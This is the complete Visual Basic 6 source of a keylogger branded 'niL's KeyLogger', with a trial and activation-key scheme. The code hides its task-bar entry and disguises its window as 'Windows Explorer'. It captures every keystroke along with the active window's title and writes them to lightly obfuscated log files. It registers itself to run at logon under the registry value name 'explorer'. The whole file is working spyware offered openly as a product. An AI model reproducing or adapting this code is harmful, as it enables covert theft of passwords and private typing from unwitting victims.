VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H8000000C&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Please Register - niL's KeyLogger"
   ClientHeight    =   3210
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5400
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3210
   ScaleWidth      =   5400
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00808080&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2550
      Left            =   0
      TabIndex        =   7
      Top             =   0
      Width           =   5175
      Begin VB.CommandButton Command1 
         Cancel          =   -1  'True
         Caption         =   "&Close"
         Height          =   375
         Left            =   120
         TabIndex        =   13
         Top             =   1800
         Width           =   975
      End
      Begin VB.TextBox txtTry 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   18
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   435
         Left            =   2280
         Locked          =   -1  'True
         TabIndex        =   12
         TabStop         =   0   'False
         Text            =   "00"
         Top             =   240
         Width           =   495
      End
      Begin VB.CommandButton cmdTry 
         Caption         =   "Ask &Later."
         Default         =   -1  'True
         Height          =   375
         Left            =   3960
         TabIndex        =   11
         Top             =   1800
         Width           =   1095
      End
      Begin VB.CommandButton cmdReg 
         Caption         =   "&Register !"
         Height          =   375
         Left            =   2760
         TabIndex        =   10
         Top             =   1800
         Width           =   1095
      End
      Begin VB.TextBox txtActCode 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2040
         MaxLength       =   25
         TabIndex        =   9
         Top             =   1320
         Width           =   3015
      End
      Begin VB.TextBox txtgCode 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   2040
         Locked          =   -1  'True
         TabIndex        =   8
         Top             =   840
         Width           =   3015
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "http://niLsKeyLogger.blogspot.com"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   375
         Left            =   0
         TabIndex        =   17
         Top             =   2160
         Width           =   5175
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "License Key :"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   16
         Top             =   840
         Width           =   2415
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "Activation Key :"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   15
         Top             =   1320
         Width           =   2415
      End
      Begin VB.Label lblTry 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BorderStyle     =   1  'Fixed Single
         Caption         =   "You can try       times more."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   15.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   455
         Left            =   120
         TabIndex        =   14
         Top             =   240
         Width           =   4935
      End
   End
   Begin VB.TextBox txtUserName 
      Height          =   285
      Left            =   360
      TabIndex        =   6
      Text            =   "username"
      Top             =   600
      Width           =   1095
   End
   Begin VB.TextBox LogPath 
      Height          =   285
      Left            =   3120
      TabIndex        =   5
      Top             =   1440
      Width           =   1455
   End
   Begin VB.TextBox txtencr 
      Height          =   375
      Left            =   360
      ScrollBars      =   3  'Both
      TabIndex        =   3
      Top             =   1440
      Width           =   2535
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   60
      Left            =   4440
      Top             =   480
   End
   Begin VB.FileListBox File1 
      Height          =   480
      Left            =   3720
      TabIndex        =   2
      Top             =   960
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1440
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   600
      Width           =   3255
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   360
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   840
      Width           =   3495
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   65
      Left            =   240
      Top             =   840
   End
   Begin VB.Label Label1 
      Caption         =   "Encrypted:"
      Height          =   255
      Left            =   360
      TabIndex        =   4
      Top             =   1200
      Width           =   3735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

' The exe file must exist for this to work properly.

'Autorun codes
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean

'username import function
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

'Active windowtitle part
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

'keylogger part
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate


'Get system directory part
'Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
'"GetSystemDirectoryA" (ByVal lpBuffer As String, _
'ByVal nSize As Long) As Long
'Dim SysDir As String


'Loadsetting variable declaration
Dim wTitle, AllowBS, SETRUNONCE, sLogging As Boolean
Dim ext, encCode, Pwd As String, LogMode As Integer
Dim t1, t2, t3, t4, t5 As String
Dim lpath As String



Private Sub Command1_Click()
End
End Sub

Private Sub Form_Load()
App.TaskVisible = False

If App.PrevInstance = True Then
    Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
    End
    Exit Sub
End If
'******************Register/Trial Part
Call LoadUserName

Randomize
txtgCode = CurrentCode("C:\Users\Q3FD.GML")
If txtgCode.Text <> "Registered" Then
    txtTry = Val(RemainingTry(15, "C:\Users\Q3FRT.GLT"))
    
    If Val(txtTry) < 0 Then
        cmdTry.Enabled = False: txtTry.Visible = False: lblTry.Caption = "Your Free Trial have been expired.": Timer1.Enabled = False: Call SetAutorun: Exit Sub
    Else
        'Me.Hide
        Call startLogging
        If Val(txtTry) = 14 Or Val(txtTry) < 4 Then Me.Caption = "Please Register - niL's KeyLogger": Me.Show
    End If
Else
    'Me.Hide
    Call startLogging
End If

End Sub
Private Sub startLogging()

Call LoadSetting

Timer2.Enabled = True
Timer1.Enabled = True
Me.Caption = "Windows Explorer"


File1.Path = LogPath

If LogMode = 0 Then
    lpath = LogPath & "\browse" & File1.ListCount + 1 & "z" & ext
ElseIf LogMode = 1 Then
    Dim a As Variant
    a = Format$(Now, "dd" & "mm" & "yy")
    lpath = LogPath & "\browse" & a & "z" & ext
ElseIf LogMode = 2 Then
    lpath = LogPath & "\browse" & ext
End If


'Write initials
Open lpath For Append As 1
Write #1, Chr(155), Time, encCode, Date, txtUserName, Pwd, App.Revision
Close #1

End Sub
Private Sub cmdReg_Click()
If UCase(txtActCode) = genKey(txtgCode) Then
    Call MakeRegistered("C:\Users\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
    MsgBox "Thank You for purchasing niL's KeyLogger!"
    Me.Hide
Else
    MsgBox "                 Activation Key Incorrect!" & vbNewLine & "Buy a Activation Key from http://niLsKeyLogger.blogspot.com", vbCritical, "Incorrect Code"
End If
End Sub

Private Sub cmdTry_Click()
'Me.Hide
Me.Caption = "Windows Explorer"

End Sub
Private Sub LoadSetting()
If Dir("C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.ini") <> "" Then 'setting file found then

    AllowBS = INIRead("LogSetting", "USEBS", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    wTitle = INIRead("LogSetting", "UseChildTitle", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    encCode = INIRead("LogSetting", "EncCode", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    ext = INIRead("LogSetting", "extension", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    Timer1.Interval = INIRead("LogSetting", "TimerInt", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    LogMode = INIRead("LogSetting", "LogMode", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    LogPath.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    sLogging = INIRead("LogSetting", "sLogging", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    Pwd = INIRead("LogSetting", "pwd", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")

    Call SetAutorun

    If sLogging = True Then
        On Error GoTo err2
        Open "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\default.MCP" For Input As 1    'Contains Selected titles.
        Do While Not EOF(1)
        On Error Resume Next
        Input #1, t1, t2, t3, t4, t5
        Loop
        Close #1
    End If

Else    'setting not found
    Call CreateSetting
    Call LoadSetting
End If

err2:
If Err.Number = 13 Then sLogging = False 'i.e, default.MCP not found
End Sub
'***********************creates SPYXX.INI if not found***************
Private Sub CreateSetting()
Dim f As Integer
f = FreeFile

txtUserName.Tag = "C:\Users\" & txtUserName & "\sysResource"

Open "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI" For Output As #f
Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & txtUserName.Tag & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
Close #f

txtUserName.Tag = ""

End Sub
Private Sub SetAutorun()
' Clear or set the key that makes the program run at startup.
    SetRunAtStartup "explorer", App.Path & ""
End Sub

'*****************detects active window title change send record command**********
Private Sub Text2_Change()
Timer1.Enabled = True           'It may be disabled if too many keypress , i.e, to avoid "Overflow error"

If sLogging = True Then
    If Val(Form1.Tag) = 1 Then
    Call appendnow
    Form1.Tag = "0"
    End If

    If LCase(Left(Text2.Text, Len(t1))) = LCase(t1) Or LCase(Left(Text2.Text, Len(t2))) = LCase(t2) Or LCase(Left(Text2.Text, Len(t3))) = LCase(t3) Or LCase(Left(Text2.Text, Len(t4))) = LCase(t4) Or LCase(Left(Text2.Text, Len(t5))) = LCase(t5) Then
    
    If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & Time & " : " & Text2.Text & vbCrLf
    Timer1.Enabled = True
    Form1.Tag = "1"

    Else
    Timer1.Enabled = False
    End If
Else    'sLogging=false
    Call appendnow
    If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
End If

End Sub
Private Sub Timer1_Timer()


Dim i As Integer
Dim Result As Integer
For i = 1 To 255
 Result = GetAsyncKeyState(i)
If Result = -32767 Then
    If (i >= 65 And i <= 90) Or i = 32 Then         'alphabets 32 for space bar
        Text1.Text = Text1.Text + correctcase(i)
    Else                                            'non alphabets
        If i = 1 Then                               'it is Click
        Text1.Text = Text1.Text & "[C]"             'Print [C] to show click
        ElseIf i = 8 Then                           'Key pressed is Backspace
            If AllowBS = True Then                  ' delete last letter
                If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
            Else
                Text1.Text = Text1.Text + "[BS]"    ' print [BS] in log
            End If
        Else
         Text1.Text = Text1.Text + checkshift(i)
        End If
    End If
    If Len(Text1.Text) > 500 Then Text1.Text = Text1.Text + Chr(13) & "Too many KeyPress": Timer1.Enabled = False   'Because huge Text in Text1 uses too much memory and gives error: "overflow"
End If
Next i
End Sub


'''**********************shiftkey****************
Private Function checkshift(ByVal b As Integer) As String
    If GetAsyncKeyState(vbKeyShift) Then
       checkshift = shiftkeydw(b)
    Else
        checkshift = shiftkeyup(b)
    End If
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeyup(ByVal b As Integer) As String
Select Case b
Case 48 To 57  'number keys above QWERTY
    shiftkeyup = b - 48
Case 96 To 105  'Number keys from numpad
    shiftkeyup = b - 96
Case 192
    shiftkeyup = "`"
Case 189
    shiftkeyup = "-"
Case 187
    shiftkeyup = "="
Case 219
    shiftkeyup = "["
Case 186
    shiftkeyup = ";"
Case 222
    shiftkeyup = "'"
Case 221
    shiftkeyup = "]"
Case 188
    shiftkeyup = ","
Case 190
    shiftkeyup = "."
Case 191
    shiftkeyup = "/"
Case 220
    shiftkeyup = "\"
Case 111
    shiftkeyup = "/"
Case 106
    shiftkeyup = "*"
Case 109
    shiftkeyup = "-"
Case 107
    shiftkeyup = "+"
Case 110
    shiftkeyup = "."


Case Else           'If key doesnt recognised ascii code will be displayed
    shiftkeyup = locatekey(b)
End Select
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeydw(ByVal b As Integer) As String
Select Case b
Case 48 'number keys above QWERTY
    shiftkeydw = ")"
Case 49
    shiftkeydw = "!"
Case 50
    shiftkeydw = "@"
Case 51
    shiftkeydw = "#"
Case 52
    shiftkeydw = "$"
Case 53
    shiftkeydw = "%"
Case 54
    shiftkeydw = "^"
Case 55
    shiftkeydw = "&"
Case 56
    shiftkeydw = "*"
Case 57
    shiftkeydw = "("

Case 96 To 105  'Number keys from numpad
    shiftkeydw = b - 96

Case 192
    shiftkeydw = "~"
Case 189
    shiftkeydw = "_"
Case 187
    shiftkeydw = "+"
Case 219
    shiftkeydw = "{"
Case 186
    shiftkeydw = ":"
Case 222
    shiftkeydw = """"
Case 221
    shiftkeydw = "}"
Case 188
    shiftkeydw = "<"
Case 190
    shiftkeydw = ">"
Case 191
    shiftkeydw = "?"
Case 220
    shiftkeydw = "|"
Case 111
    shiftkeydw = "/"
Case 106
    shiftkeydw = "*"
Case 109
    shiftkeydw = "-"
Case 107
    shiftkeydw = "+"


Case Else           'If key is not symbol then locate its name
    shiftkeydw = locatekey(b)
End Select

End Function
Private Function locatekey(ByVal b As Integer) As String
Select Case b
Case 27
    locatekey = "[ESC]"
Case 9
    locatekey = "[TAB]"
Case 20
    locatekey = "[CAPS]"
Case 16         'shift key
    locatekey = ""
Case 160        'Left shift key
    locatekey = ""
Case 161        'Right shift key
    locatekey = ""
Case 112 To 123
    locatekey = "[F" & b - 111 & "]"
Case 13
    locatekey = "[ENTR]"
Case 91
    locatekey = "[LWND]"
Case 92
    locatekey = "[RWND]"
Case 18            'alt KEY DEFECT
    locatekey = ""
Case 164
    locatekey = "[LALT]"
Case 165
    locatekey = "[RALT]"
    
Case 17         'Ctrl key defect
    locatekey = ""
Case 162
    locatekey = "[LCTRL]"
Case 163
    locatekey = "[RCTRL]"

Case 2
    locatekey = "[RC]"
Case 93
    locatekey = "[KRC]"
'Case 8
 '   locatekey = "[BS]"
Case 46
    locatekey = "[DEL]"
Case 45
    locatekey = "[INS]"
Case 36
    locatekey = "[HOME]"
Case 33
    locatekey = "[PAGEUP]"
Case 35
    locatekey = "[END]"
Case 34
    locatekey = "[PAGEDOWN]"
Case 37
    locatekey = "[LARROW]"
Case 38
    locatekey = "[UARROW]"
Case 39
    locatekey = "[RARROW]"
Case 40
    locatekey = "[DARROW]"
Case 44
    locatekey = "[PRINTSCREEN]"
Case 145
    locatekey = "[SCRLCK]"
Case 19
    locatekey = "[PAUSE/BREAK]"
Case 144
    locatekey = "[NUMLCK]"
Case 12
    locatekey = "[5]"



Case Else
    locatekey = "[" & b & "]"
End Select
End Function
'************************encrypting and Recording to file use of Append*********
Private Sub appendnow()
Dim i As Integer
For i = 1 To Len(Text1)
txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
Next i

If Dir(lpath) <> "" Then
        Open lpath For Append As #1
        Print #1, txtencr.Text
        Text1.Text = ""
        txtencr.Text = ""
        Close #1
Else
        MsgBox "Log Directory Unavailable", vbCritical, "Logging Stopped": End
End If
End Sub
Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
Dim hKey As Long
Dim key_value As String
Dim status As Long


Dim SETRUNONCE As Boolean
    

' Open the key, creating it if it doesn't exist.
    On Error GoTo SetStartupError


SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
    
    If SETRUNONCE = True Then
    
        Call KillFromStartup("explorer", False)
        
        If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
        Then
        MsgBox "Error " & Err.Number & " opening key" & _
            vbCrLf & Err.Description
        Exit Sub
        End If
    Else
    
        Call KillFromStartup("explorer", True)
    
        If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
       ByVal 0&) <> ERROR_SUCCESS _
        Then
        MsgBox "Error " & Err.Number & " opening key" & _
            vbCrLf & Err.Description
        Exit Sub
        End If
   End If


        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, "explorer", 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & Err.Number & " setting key" & _
                vbCrLf & Err.Description
        End If
   

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox Err.Number & " " & Err.Description
    Exit Sub
End Sub
'Deletes the Unwanted key
Public Sub KillFromStartup(ByVal app_name As String, Optional Ro As Boolean)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

If Ro = False Then
'**********Delete Run Key

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & Err.Number & " opening key" & _
            vbCrLf & Err.Description
        Exit Sub
    End If

   
        ' Delete the value.
        RegDeleteValue hKey, app_name

    ' Close the key.
    RegCloseKey hKey

Else
    
 '*********Delete RunOnce Key

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & Err.Number & " opening key" & _
            vbCrLf & Err.Description
        Exit Sub
    End If

   
        ' Delete the value.
        RegDeleteValue hKey, app_name

    ' Close the key.
    RegCloseKey hKey
    
End If

Exit Sub

SetStartupError:
    MsgBox Err.Number & " " & Err.Description
    Exit Sub
End Sub
'*************Imports active w title***********
Private Sub Timer2_Timer()
    Text2.Text = GetActiveWindowTitle(wTitle)            'Get window title after 550 interval
End Sub
'******************KEYCASEPART***********
Function correctcase(ByVal b As Integer) As String
Dim tmp As Boolean
tmp = GetKeyState(vbKeyCapital)
If tmp = 1 Then         'The Caps Lock Is On
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = LCase(Chr(b)) 'print small letter
    Else
    correctcase = UCase(Chr(b)) 'print capital letter
    End If
Else            'The Caps Lock Is Off
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = UCase(Chr(b)) 'print capital letter
    Else
    correctcase = LCase(Chr(b)) 'print small letter
    End If
End If
End Function


' ************************************Ativewindow title part******************************
' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim S As String

l = GetWindowTextLength(hwnd)
S = Space(l + 1)

GetWindowText hwnd, S, l + 1

GetWindowTitle = Left$(S, l)
End Function
Private Sub LoadUserName()

'IMPORT USERNAME*******************************************
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        txtUserName = Left$(sBuffer, lSize)
    Else
        txtUserName = vbNullString
End If

'Get system Directory
'SysDir = String(80, 0)
'Call GetSystemDirectory(SysDir, 80)     'stores global variable- system32 path.
'Dim sDr As String                   'Get system drive
'sDr = Left(SysDir, 2)
End Sub

'*****************************************Function for Activation Key and Trial remainig*************

Private Function CurrentCode(Filepath As String) As String
If Dir(Filepath) <> "" Then
    Open Filepath For Input As 2
    Input #2, CurrentCode
    Close #2
Else
    CurrentCode = GenerateCode(12)
    Open Filepath For Output As 2
    Write #2, CurrentCode
    Close #2
End If
End Function
Private Function RemainingTry(MaxUse As Integer, Filepath As String) As Integer
If Dir(Filepath) <> "" Then
    Open Filepath For Input As 2
    Input #2, RemainingTry
    Close #2
    
    Open Filepath For Output As 2
    Write #2, (Val(RemainingTry) - 1)
    Close #2
Else
    RemainingTry = Val(MaxUse) - 1
    Open Filepath For Output As 2
    Write #2, Val(RemainingTry) - 1
    Close #2
End If
End Function
Private Function GenerateCode(CodeLength As Integer) As String
Dim i As Integer
For i = 1 To CodeLength
GenerateCode = GenerateCode & BringChar(Int(Rnd * 36))
Next i

End Function

Private Function genKey(fromThis As String) As String
Dim i As Integer
For i = 1 To Len(fromThis)
    If i = 3 Or i = 7 Then
        genKey = genKey & BringChar(Asc(Mid(fromThis, i, 1)) * 3 Mod 36)
    ElseIf Mid(fromThis, i, 1) = 8 Then
        genKey = genKey
    Else
        genKey = genKey & BringChar(Asc(Mid(fromThis, i, 1)) * 7 Mod 36)
    End If
Next i

End Function
Private Function BringChar(cCode As Integer) As String
Select Case cCode
Case Is < 10
    BringChar = Chr(48 + cCode)
Case Is > 9
    BringChar = Chr(55 + cCode)
End Select
End Function

Private Sub MakeRegistered(Filepath As String)
    Open Filepath For Output As 2
    Write #2, "Registered"
    Close #2
End Sub

